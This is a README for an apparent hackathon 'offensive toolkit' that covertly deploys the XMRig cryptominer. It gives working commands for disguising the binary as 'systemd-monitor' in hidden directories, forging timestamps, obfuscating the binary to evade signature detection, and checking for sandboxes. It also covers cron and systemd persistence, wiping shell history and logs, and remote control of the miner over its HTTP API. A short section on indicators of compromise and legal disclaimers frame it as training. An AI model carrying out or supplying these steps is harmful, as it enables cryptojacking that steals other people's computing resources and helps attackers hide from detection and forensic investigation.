# XMRig Offensive Toolkit - OSCP Hackathon 2025

**Purpose:** Educational demonstration of cryptominer deployment techniques for defensive security training.

**WARNING:** Use only in authorized testing environments. Unauthorized deployment is illegal.

---

## 📦 Toolkit Structure

```
offensive_toolkit/
├── payloads/
│   └── obfuscate_binary.py       # Binary obfuscation tool
├── deployment/
│   └── stealth_deploy.sh          # Automated deployment script
├── persistence/
│   └── install_persistence.sh     # Persistence mechanism installer
├── configs/
│   ├── stealth_high.json          # Maximum stealth (1 thread, idle priority)
│   ├── stealth_medium.json        # Balanced (2 threads)
│   ├── aggressive.json            # Maximum performance (all threads)
│   └── c2_controlled.json         # Remote API control
├── cleanup/
│   └── forensic_cleanup.sh        # Anti-forensics cleanup
└── README.md                      # This file
```

---

## 🎯 Quick Start

### Option 1: Automated Deployment (Recommended)

```bash
# Full automated deployment with stealth
./deployment/stealth_deploy.sh <WALLET_ADDRESS> [POOL_URL]

# Example:
./deployment/stealth_deploy.sh 4xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx pool.supportxmr.com:443
```

**What it does:**
1. Sandbox detection checks
2. Downloads XMRig binary
3. Installs with obfuscated name
4. Creates stealth configuration
5. Establishes persistence
6. Clears deployment tracks

---

### Option 2: Manual Step-by-Step

#### Step 1: Prepare Payload

```bash
cd xmrig-6.24.0

# Option A: Use as-is (faster, more detectable)
cp xmrig /tmp/miner

# Option B: Obfuscate binary (slower, less detectable)
../offensive_toolkit/payloads/obfuscate_binary.py xmrig /tmp/miner_obf
```

#### Step 2: Configure Miner

```bash
# Copy config template
cp ../offensive_toolkit/configs/stealth_high.json /tmp/config.json

# Edit with your wallet
sed -i 's/YOUR_WALLET_ADDRESS/4xxxxxx.../' /tmp/config.json

# Optionally edit pool URL
sed -i 's|pool.supportxmr.com:443|YOUR_POOL:PORT|' /tmp/config.json
```

#### Step 3: Install with Stealth

```bash
# Create hidden directory
mkdir -p /opt/.cache

# Install with obfuscated name
cp /tmp/miner /opt/.cache/systemd-monitor
chmod +x /opt/.cache/systemd-monitor

# Copy config
cp /tmp/config.json /opt/.cache/.config.json

# Match timestamps (anti-forensics)
touch -r /bin/ls /opt/.cache/systemd-monitor
touch -r /bin/ls /opt/.cache/.config.json
```

#### Step 4: Establish Persistence

```bash
# Interactive menu
../offensive_toolkit/persistence/install_persistence.sh \
    /opt/.cache/systemd-monitor \
    /opt/.cache/.config.json

# OR automated (cron + systemd user)
crontab -l 2>/dev/null; echo "@reboot /opt/.cache/systemd-monitor -c /opt/.cache/.config.json >/dev/null 2>&1" | crontab -
```

#### Step 5: Execute

```bash
# Test execution
nohup /opt/.cache/systemd-monitor -c /opt/.cache/.config.json >/dev/null 2>&1 &

# Verify
ps aux | grep systemd-monitor
top -p $(pgrep systemd-monitor)
```

#### Step 6: Cleanup Tracks

```bash
# Automated cleanup
../offensive_toolkit/cleanup/forensic_cleanup.sh --auto

# OR manual
history -c
rm -f /tmp/miner /tmp/config.json
unset HISTFILE
```

---

## 🛠️ Tool Documentation

### 1. Binary Obfuscator (`obfuscate_binary.py`)

**Purpose:** Modify XMRig binary to evade signature detection

**Usage:**
```bash
python3 obfuscate_binary.py <input_binary> <output_binary>
```

**What it does:**
- XOR encodes signature strings (`xmrig`, `donate.v2.xmrig.com`, etc.)
- Modifies ELF build ID
- Adds random padding to change file size
- Generates decoder stub and modification log

**Example:**
```bash
cd payloads/
python3 obfuscate_binary.py ../../xmrig-6.24.0/xmrig xmrig_obfuscated

# Files created:
# - xmrig_obfuscated (modified binary)
# - xmrig_obfuscated_decoder.py (runtime decoder)
# - xmrig_obfuscated_log.txt (modification log)
```

**OPSEC:**
- Original hash: `129cfbfbe4c37a970abab20202639c1481ed0674ff9420d507f6ca4f2ed7796a`
- Obfuscated hash: `<UNIQUE>` (different every run)
- DO NOT upload obfuscated binary to VirusTotal

---

### 2. Stealth Deployment Script (`stealth_deploy.sh`)

**Purpose:** Fully automated deployment with evasion

**Usage:**
```bash
./stealth_deploy.sh <wallet_address> [pool_url]
```

**Features:**
- **Sandbox Detection:**
  - CPU count check (<2 cores = likely sandbox)
  - RAM check (<2GB = suspicious)
  - Disk size check (<20GB = VM)
  - Uptime check (<10 min = fresh sandbox)
  - VM kernel module detection

- **Evasion Techniques:**
  - Random process names (`systemd-monitor`, `kworker-update`)
  - Hidden directories (`/tmp/...`, `/opt/.cache`)
  - Timestamp manipulation (match system files)
  - TLS encryption (port 443)
  - Low resource usage (1 thread, idle priority)

- **Anti-Forensics:**
  - Clears bash history
  - Nulls out HISTFILE
  - Removes wget artifacts
  - Secures deployment files

**Example:**
```bash
./deployment/stealth_deploy.sh 4xxxxxx pool.supportxmr.com:443
```

---

### 3. Persistence Installer (`install_persistence.sh`)

**Purpose:** Multiple persistence mechanisms with OPSEC

**Usage:**
```bash
./install_persistence.sh <binary_path> <config_path>
```

**Methods Available:**

| Method | Root Required | Detection Difficulty | Reliability |
|--------|---------------|---------------------|-------------|
| Systemd Service | Yes | Medium | High |
| Cron Job | No | Low | Medium |
| RC.local | Yes | Low | Medium |
| User Profile (.bashrc) | No | Medium | Low |
| XDG Autostart | No | Medium | Medium |
| At Job | No | Low | Low |
| Systemd User Service | No | Medium | High |

**Example:**
```bash
# Interactive menu
./persistence/install_persistence.sh /opt/.cache/miner /opt/.cache/config.json

# Automated (all user methods)
# Choose option 8 from menu
```

**OPSEC Tips:**
- Systemd services: Use legitimate-sounding names
- Cron: Add hourly check to ensure process running
- Profile: Hide in existing environment variable exports
- XDG: Set `NoDisplay=true` to avoid GUI visibility

---

### 4. Forensic Cleanup (`forensic_cleanup.sh`)

**Purpose:** Remove all traces of deployment

**Usage:**
```bash
# Interactive menu
./cleanup/forensic_cleanup.sh

# Automated complete cleanup
./cleanup/forensic_cleanup.sh --auto

# Targeted cleanup
./cleanup/forensic_cleanup.sh /opt/.cache
```

**Cleanup Actions:**
- Kills all XMRig processes
- Removes persistence (cron, systemd, profile)
- Deletes binaries and configs
- Clears bash history
- Removes temp files
- Clears network artifacts (wget history, DNS cache)
- Clears log files (requires root)

**Example:**
```bash
# Complete cleanup
./cleanup/forensic_cleanup.sh --auto

# Verify
ps aux | grep -i xmrig
crontab -l
systemctl list-units | grep -i monitor
```

---

## 📋 Configuration Templates

### stealth_high.json
- **CPU Usage:** 12% (1 thread on 8-core system)
- **Priority:** 0 (idle)
- **Pause on Activity:** 120 seconds
- **TLS:** Enabled (port 443)
- **Detection:** Very difficult
- **Hashrate:** Very low

### stealth_medium.json
- **CPU Usage:** 25% (2 threads)
- **Priority:** 1 (below normal)
- **Pause on Activity:** 60 seconds
- **TLS:** Enabled
- **Detection:** Difficult
- **Hashrate:** Low

### aggressive.json
- **CPU Usage:** 100% (all threads)
- **Priority:** 3 (above normal)
- **Huge Pages:** Enabled (requires root)
- **TLS:** Disabled (faster)
- **Detection:** Easy
- **Hashrate:** Maximum

### c2_controlled.json
- **HTTP API:** Enabled (0.0.0.0:8080)
- **Access Token:** `SecretToken123`
- **Remote Control:** Full
- **CPU Usage:** 50% (balanced)
- **Detection:** Medium

---

## 🎮 C2 Control (Remote Management)

### Setup C2-Controlled Miner

```bash
# Use C2 config
./deployment/stealth_deploy.sh WALLET pool.supportxmr.com:3333

# Manually set C2 config
cp configs/c2_controlled.json /opt/.cache/.config.json
/opt/.cache/miner -c /opt/.cache/.config.json &
```

### C2 Commands

```bash
TARGET_IP="192.168.45.100"
TOKEN="SecretToken123"
API="http://${TARGET_IP}:8080"

# Get status
curl -s "$API/2/summary" -H "Authorization: Bearer $TOKEN" | jq .

# Pause mining
curl -X POST "$API/2/json/stop" -H "Authorization: Bearer $TOKEN"

# Resume mining
curl -X POST "$API/2/json/start" -H "Authorization: Bearer $TOKEN"

# Get config
curl -s "$API/2/config" -H "Authorization: Bearer $TOKEN" | jq .

# Update threads (reduce to 1)
curl -X POST "$API/2/json/config" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"cpu":{"max-threads-hint":12}}'

# Get backend info
curl -s "$API/2/backends" -H "Authorization: Bearer $TOKEN" | jq .
```

### API Endpoints Reference

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/2/summary` | GET | Hashrate, pool status, uptime |
| `/2/backends` | GET | CPU/GPU configuration |
| `/2/config` | GET | Full configuration dump |
| `/2/json/start` | POST | Resume mining |
| `/2/json/stop` | POST | Pause mining |
| `/2/json/config` | POST | Update configuration |

---

## 🔍 Detection & Testing

### Verify Stealth

```bash
# Check CPU usage (should be low)
top -b -n 1 | grep systemd-monitor

# Check network connections
netstat -tunap | grep systemd-monitor

# Check process tree
pstree -p | grep systemd-monitor

# Check memory usage
ps aux --sort=-%mem | head -20
```

### IOCs (Indicators of Compromise)

**Process Indicators:**
- High CPU usage from unknown process
- Processes without parent (orphaned)
- Unusual process names with brackets
- Hidden processes (names starting with `.`)

**Network Indicators:**
- Connections to ports: 3333, 4444, 5555 (common mining ports)
- TLS connections to unknown domains
- High outbound traffic volume
- DNS queries to mining pool domains

**File Indicators:**
- Large executables in /tmp, /opt/.cache
- Hidden directories (starting with `.` or `...`)
- JSON configs with `randomx`, `huge-pages`
- Modified timestamps matching system files

**Persistence Indicators:**
- Suspicious cron jobs (`crontab -l`)
- Unknown systemd services
- Modified .bashrc/.profile
- XDG autostart entries

---

## 🛡️ OPSEC Best Practices

### DO:
- ✅ Test in isolated lab first
- ✅ Use TLS encryption (port 443)
- ✅ Limit CPU usage (<50%)
- ✅ Clear deployment tracks
- ✅ Use legitimate process names
- ✅ Match file timestamps
- ✅ Implement sandbox detection
- ✅ Test on local VM before deployment

### DON'T:
- ❌ Upload to VirusTotal
- ❌ Use default configuration
- ❌ Max out CPU immediately
- ❌ Leave wget/curl history
- ❌ Use obvious file names
- ❌ Skip anti-forensics
- ❌ Deploy without authorization
- ❌ Test on production systems

---

## 📊 Deployment Checklist

### Pre-Deployment
- [ ] Obtain written authorization
- [ ] Prepare wallet address
- [ ] Select mining pool
- [ ] Choose evasion level
- [ ] Test in lab environment
- [ ] Prepare incident response plan

### Deployment
- [ ] Run sandbox detection checks
- [ ] Obfuscate binary (if needed)
- [ ] Configure stealth settings
- [ ] Install in hidden location
- [ ] Establish persistence
- [ ] Test execution
- [ ] Verify network connectivity

### Post-Deployment
- [ ] Verify mining activity
- [ ] Check resource usage
- [ ] Test remote control (if C2)
- [ ] Monitor for detection
- [ ] Document IOCs for blue team
- [ ] Clear deployment artifacts

### Cleanup
- [ ] Kill processes
- [ ] Remove persistence
- [ ] Delete binaries/configs
- [ ] Clear logs (if authorized)
- [ ] Clear bash history
- [ ] Verify complete removal

---

## 🎓 Educational Objectives

### Red Team Skills
- Post-exploitation payload deployment
- Binary obfuscation techniques
- Persistence mechanism implementation
- Anti-forensics practices
- Sandbox evasion
- C2 infrastructure setup

### Blue Team Skills
- Cryptominer detection methodologies
- Behavioral analysis techniques
- Network traffic analysis
- Forensic artifact recovery
- Incident response procedures
- YARA/Sigma rule creation

---

## ⚖️ Legal & Ethical Disclaimer

**THIS TOOLKIT IS FOR AUTHORIZED SECURITY RESEARCH ONLY**

### ✅ Authorized Use Cases:
- Personal lab environments
- Authorized penetration testing (written permission)
- Security training/education
- Controlled demonstrations
- Defensive research

### ❌ Prohibited Actions:
- Unauthorized system access
- Deployment without explicit permission
- Any illegal cryptojacking activity
- Testing on production systems without approval

**WARNING:** Unauthorized deployment of cryptocurrency miners is illegal in most jurisdictions and may result in criminal prosecution.

Always obtain explicit written authorization before deploying any security tools.

---

## 📚 References

- **XMRig Official:** https://github.com/xmrig/xmrig
- **Monero Pools:** https://miningpoolstats.stream/monero
- **OSCP Syllabus:** https://www.offensive-security.com/pwk-oscp/
- **MITRE ATT&CK T1496:** Resource Hijacking

---

## 🤝 Support

For issues, questions, or improvements:
1. Review the documentation thoroughly
2. Check the HACKATHON_PAYLOAD_GUIDE.md
3. Consult OSCP mentor/instructor
4. Test in isolated environment first

---

**Toolkit Version:** 1.0
**Last Updated:** 2025-10-02
**Author:** OSCP Hackathon Team
**License:** Educational Use Only
